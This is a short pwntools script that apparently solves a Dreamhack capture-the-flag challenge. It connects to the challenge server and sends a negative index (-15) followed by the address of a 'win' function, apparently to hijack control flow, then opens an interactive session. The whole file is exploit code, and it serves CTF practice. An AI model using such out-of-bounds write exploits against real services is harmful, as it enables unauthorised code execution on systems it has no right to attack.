from pwn import *

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 12607
r = remote(HOST, PORT)

win=0x4011b6
r.sendlineafter(b': ', str(-15).encode())
r.sendlineafter(b': ', str(win).encode())

r.interactive()